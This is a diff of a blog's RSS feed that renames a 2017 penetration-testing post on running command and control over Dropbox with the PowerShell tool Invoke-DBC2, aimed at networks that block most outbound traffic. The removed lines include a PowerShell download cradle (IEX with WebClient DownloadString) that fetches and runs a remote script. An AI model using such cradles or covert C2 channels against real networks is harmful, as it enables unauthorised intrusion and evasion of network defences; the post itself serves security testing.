@@ -10,11 +10,11 @@
     <atom:link href="https://truneski.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
-      <title>Dropbox Command and Control Over Powershell!!</title>
-      <link>https://truneski.github.io/blog/2017/03/03/dropbox-command-and-control-over-powershell/</link>
+      <title>Dropbox Command and Control Over Powershell with Invoke-DBC2</title>
+      <link>https://truneski.github.io/blog/2017/03/03/dropbox-command-and-control-over-powershell-with-invoke-dbc2/</link>
       <pubDate>Fri, 03 Mar 2017 07:02:14 +0100</pubDate>
       
-      <guid>https://truneski.github.io/blog/2017/03/03/dropbox-command-and-control-over-powershell/</guid>
+      <guid>https://truneski.github.io/blog/2017/03/03/dropbox-command-and-control-over-powershell-with-invoke-dbc2/</guid>
       <description>
 
 &lt;p&gt;Consider a scenario where a Penetration Tester is trying to set up command and control on an internal network blocking all outbound traffic, except traffic towards a few specific servers or 3rd party File Sharing websites. In this situation, there are still a few options a tester can use. One of those is DNS command and control and the other is Command and control over file sharing sites such as Dropbox and Google docs. In this blog post we will explore how Dropbox can be used for such operations and more.&lt;/p&gt;
@@ -43,12 +43,7 @@ and I highly recommend it. Once you&amp;rsquo;ve setup the server and its ready,
 &lt;p&gt;The server will then ask for your DropBox Access token and master password to encrypt all data between agent and server controller.
 A windows machine with Powershell version 5.0 is required. The DBC2 script can be loaded by downloading the script and running it as shown:&lt;/p&gt;
 
-&lt;pre&gt;&lt;code&gt;. .\DropBoxC2.ps1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Alternatively you can host it on your own server or github page and use a download cradle as shown:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;&amp;lt;insert server name or github page/DropBox.ps1&amp;gt;&#39;)
+&lt;pre&gt;&lt;code&gt;. .\Invoke-DBC2.ps1
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Once the script is loaded run the following command to start the DBC2 Powershell Agent:&lt;/p&gt;
